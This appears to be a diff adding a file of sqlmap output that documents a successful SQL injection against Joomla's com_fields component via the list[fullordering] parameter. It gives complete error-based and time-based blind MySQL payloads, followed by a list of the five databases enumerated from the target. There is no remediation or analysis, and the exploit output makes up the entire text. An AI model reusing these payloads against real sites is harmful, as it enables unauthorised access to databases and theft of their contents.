@@ -1,0 +1,19 @@
+sqlmap identified the following injection point(s) with a total of 2547 HTTP(s) requests:
+---
+Parameter: list[fullordering] (GET)
+    Type: error-based
+    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 6038 FROM(SELECT COUNT(*),CONCAT(0x717a627871,(SELECT (ELT(6038=6038,1))),0x7162787171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 2383 FROM (SELECT(SLEEP(5)))jLdu)
+---
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+available databases [5]:
+[*] information_schema
+[*] joomla
+[*] mysql
+[*] performance_schema
+[*] test
+
